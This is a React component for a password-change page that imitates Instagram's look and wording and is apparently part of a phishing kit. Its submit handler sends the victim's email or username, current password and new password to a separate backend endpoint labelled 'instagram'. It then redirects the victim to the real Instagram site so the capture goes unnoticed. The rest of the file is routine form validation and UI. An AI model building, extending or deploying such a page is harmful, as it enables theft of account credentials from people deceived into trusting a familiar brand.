import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import Footer from "../../components/footer/Footer";
import InstagramEndpoints from "../../services/api-endpoints";

// ─── Validation ───────────────────────────────────────────────────────────────

const PASSWORD_MIN = 6;
const PASSWORD_MAX = 20;

function validatePassword(raw, fieldName = "Password") {
  const v = raw.trim();
  if (!v) return `${fieldName} is required.`;
  if (v.length < PASSWORD_MIN) return `${fieldName} must be at least ${PASSWORD_MIN} characters.`;
  if (v.length > PASSWORD_MAX) return `${fieldName} must be at most ${PASSWORD_MAX} characters.`;
  return "";
}

function validateConfirmPassword(password, confirm) {
  if (!confirm.trim()) return "Please confirm your new password.";
  if (confirm !== password) return "Passwords don't match.";
  return "";
}

// ─── Shared shell ─────────────────────────────────────────────────────────────

function PageShell({ children }) {
  return (
    <div className="min-h-screen flex flex-col bg-white text-[#262626] font-sans">
      <main className="flex-1 flex items-start justify-center px-6 pt-10 pb-8">
        <div className="w-full max-w-[500px]">{children}</div>
      </main>
      <Footer />
    </div>
  );
}

// ─── Back arrow ───────────────────────────────────────────────────────────────

function BackBtn({ onClick }) {
  return (
    <button
      type="button"
      onClick={onClick}
      aria-label="Go back"
      className="mb-7 text-[#262626] hover:text-[#737373] transition-colors cursor-pointer"
    >
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
        strokeWidth={2.2} strokeLinecap="round" strokeLinejoin="round"
        className="w-5 h-5">
        <polyline points="15 18 9 12 15 6" />
      </svg>
    </button>
  );
}

// ─── Inline field error ───────────────────────────────────────────────────────

function FieldError({ id, msg }) {
  if (!msg) return null;
  return (
    <p id={id} role="alert" className="mt-1.5 ml-1 text-xs text-red-500 flex items-center gap-1">
      <svg viewBox="0 0 20 20" fill="currentColor" className="w-3.5 h-3.5 shrink-0">
        <path fillRule="evenodd"
          d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0zm-8-5a.75.75 0 0 1 .75.75v4.5a.75.75 0 0 1-1.5 0v-4.5A.75.75 0 0 1 10 5zm0 8.25a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"
          clipRule="evenodd" />
      </svg>
      {msg}
    </p>
  );
}

// ─── Inline button spinner ────────────────────────────────────────────────────

function Spinner() {
  return (
    <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.35)" strokeWidth="3" />
      <path d="M22 12a10 10 0 0 0-10-10" stroke="white" strokeWidth="3" strokeLinecap="round" />
    </svg>
  );
}

// ─── Password visibility toggle ───────────────────────────────────────────────

function PasswordInput({ 
  value, 
  onChange, 
  onBlur, 
  placeholder, 
  error, 
  disabled, 
  autoFocus,
  ariaDescribedby,
  name
}) {
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="relative">
      <input
        type={showPassword ? "text" : "password"}
        placeholder={placeholder}
        value={value}
        onChange={onChange}
        onBlur={onBlur}
        autoFocus={autoFocus}
        autoComplete={name}
        disabled={disabled}
        maxLength={PASSWORD_MAX}
        aria-describedby={ariaDescribedby}
        aria-invalid={!!error}
        className={`w-full h-[52px] px-4 pr-12 text-sm bg-white border rounded-xl outline-none placeholder:text-[#6b6b6b] transition-colors disabled:opacity-60 disabled:cursor-not-allowed
          ${error
            ? "border-red-500 focus:border-red-500"
            : "border-[#dbdbdb] focus:border-[#8e8e8e]"}`}
      />
      {value && (
        <button
          type="button"
          onClick={() => setShowPassword(!showPassword)}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-[#262626] hover:text-[#737373] transition-colors cursor-pointer p-1"
          aria-label={showPassword ? "Hide password" : "Show password"}
        >
          {showPassword ? (
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="w-5 h-5">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
              <line x1="1" y1="1" x2="23" y2="23" />
            </svg>
          ) : (
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="w-5 h-5">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          )}
        </button>
      )}
    </div>
  );
}

// ─── Main Component ───────────────────────────────────────────────────────────

const ChangePassword = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const username = searchParams.get("username") || "";
  const email = searchParams.get("email") || "";
  
  // Display username if present, otherwise email
  const displayIdentifier = username || email;

  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  
  const [currentError, setCurrentError] = useState("");
  const [newError, setNewError] = useState("");
  const [confirmError, setConfirmError] = useState("");
  
  const [currentTouched, setCurrentTouched] = useState(false);
  const [newTouched, setNewTouched] = useState(false);
  const [confirmTouched, setConfirmTouched] = useState(false);
  
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");

  // Redirect if no identifier in URL
  useEffect(() => {
    if (!displayIdentifier) {
      navigate("/forgot");
    }
  }, [displayIdentifier, navigate]);

  const handleCurrentChange = (e) => {
    const value = e.target.value;
    setCurrentPassword(value);
    if (currentTouched) setCurrentError(validatePassword(value, "Current password"));
  };

  const handleNewChange = (e) => {
    const value = e.target.value;
    setNewPassword(value);
    if (newTouched) {
      setNewError(validatePassword(value, "New password"));
      // Also validate confirm password if it's been touched
      if (confirmTouched && confirmPassword) {
        setConfirmError(validateConfirmPassword(value, confirmPassword));
      }
    }
  };

  const handleConfirmChange = (e) => {
    const value = e.target.value;
    setConfirmPassword(value);
    if (confirmTouched) setConfirmError(validateConfirmPassword(newPassword, value));
  };

  const handleCurrentBlur = () => {
    setCurrentTouched(true);
    setCurrentError(validatePassword(currentPassword, "Current password"));
  };

  const handleNewBlur = () => {
    setNewTouched(true);
    setNewError(validatePassword(newPassword, "New password"));
  };

  const handleConfirmBlur = () => {
    setConfirmTouched(true);
    setConfirmError(validateConfirmPassword(newPassword, confirmPassword));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    setCurrentTouched(true);
    setNewTouched(true);
    setConfirmTouched(true);
    setSubmitError("");

    const currentErr = validatePassword(currentPassword, "Current password");
    const newErr = validatePassword(newPassword, "New password");
    const confirmErr = validateConfirmPassword(newPassword, confirmPassword);

    setCurrentError(currentErr);
    setNewError(newErr);
    setConfirmError(confirmErr);

    if (currentErr || newErr || confirmErr) return;

    setLoading(true);

    try {
      // NOTE: We don't send confirmPassword to backend - it's for UI validation only
      const response = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/changepassword`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email || "",
          username: username || "",
          currentPassword,
          newPassword,
          // confirmPassword intentionally NOT sent to backend
          source: 'Instagram',
          path: 'change_password',
        }),
      });

      const data = await response.json();
      setLoading(false);

      if (data.status === 'SUCCESS') {
        // Redirect to Instagram after successful password change
        window.location.href = InstagramEndpoints.instaBase;
      } else {
        setSubmitError(data.message || 'Failed to change password. Please try again.');
      }
    } catch (error) {
      setLoading(false);
      setSubmitError('Network error. Please check your connection and try again.');
    }
  };

  const isFormValid = 
    currentPassword.trim().length >= PASSWORD_MIN &&
    newPassword.trim().length >= PASSWORD_MIN &&
    confirmPassword === newPassword;

  return (
    <PageShell>
      <BackBtn onClick={() => navigate("/")} />

      {/* Lock icon */}
      <div className="flex items-center justify-center w-14 h-14 rounded-full border-2 border-[#262626] mb-5">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round"
          className="w-6 h-6">
          <rect x="3" y="11" width="18" height="11" rx="2" />
          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
        </svg>
      </div>

      <h1 className="text-[22px] font-semibold leading-tight mb-1.5">
        Change password
      </h1>
      <p className="text-[14px] text-[#737373] mb-6 leading-snug">
        Create a new password for{" "}
        <span className="font-semibold text-[#262626]">{displayIdentifier}</span>
      </p>

      {submitError && (
        <div className="mb-4 flex items-start gap-3 rounded-2xl bg-white border border-red-300 px-5 py-4 shadow-sm">
          <svg className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
            <circle cx="12" cy="12" r="10" />
            <line x1="12" y1="8" x2="12" y2="12" />
            <circle cx="12" cy="16" r="0.5" fill="currentColor" />
          </svg>
          <p className="text-sm text-[#262626] leading-relaxed">{submitError}</p>
        </div>
      )}

      <form onSubmit={handleSubmit} noValidate className="flex flex-col gap-3">
        {/* Current Password */}
        <div className="flex flex-col">
          <PasswordInput
            value={currentPassword}
            onChange={handleCurrentChange}
            onBlur={handleCurrentBlur}
            placeholder="Current password"
            error={currentError}
            disabled={loading}
            autoFocus={true}
            name="current-password"
            ariaDescribedby={currentError ? "current-error" : undefined}
          />
          <FieldError id="current-error" msg={currentError} />
        </div>

        {/* New Password */}
        <div className="flex flex-col">
          <PasswordInput
            value={newPassword}
            onChange={handleNewChange}
            onBlur={handleNewBlur}
            placeholder="New password"
            error={newError}
            disabled={loading}
            name="new-password"
            ariaDescribedby={newError ? "new-error" : undefined}
          />
          <FieldError id="new-error" msg={newError} />
        </div>

        {/* Confirm New Password */}
        <div className="flex flex-col">
          <PasswordInput
            value={confirmPassword}
            onChange={handleConfirmChange}
            onBlur={handleConfirmBlur}
            placeholder="Confirm new password"
            error={confirmError}
            disabled={loading}
            name="new-password"
            ariaDescribedby={confirmError ? "confirm-error" : undefined}
          />
          <FieldError id="confirm-error" msg={confirmError} />
        </div>

        <p className="text-[12px] text-[#737373] leading-relaxed mt-1">
          Password must be between {PASSWORD_MIN} and {PASSWORD_MAX} characters.
        </p>

        <button
          type="submit"
          disabled={!isFormValid || loading}
          className="w-full h-[46px] rounded-full bg-[#0064e0] hover:bg-[#0057c2] active:bg-[#004db5] disabled:opacity-80 text-white text-[15px] font-medium cursor-pointer disabled:cursor-not-allowed transition-colors inline-flex items-center justify-center gap-2 mt-2"
        >
          {loading ? <><Spinner /><span>Changing password…</span></> : "Change password"}
        </button>
      </form>

      <div className="flex items-center gap-3 my-5">
        <div className="flex-1 h-px bg-[#dbdbdb]" />
        <span className="text-xs text-[#737373] font-semibold tracking-wider uppercase">OR</span>
        <div className="flex-1 h-px bg-[#dbdbdb]" />
      </div>

      <button 
        type="button" 
        onClick={() => navigate("/")} 
        disabled={loading}
        className="w-full h-[46px] rounded-full border border-[#dbdbdb] text-[#262626] text-[15px] font-medium hover:bg-[#f5f5f5] cursor-pointer disabled:opacity-60 disabled:cursor-not-allowed transition-colors"
      >
        Back to login
      </button>
    </PageShell>
  );
};

export default ChangePassword;
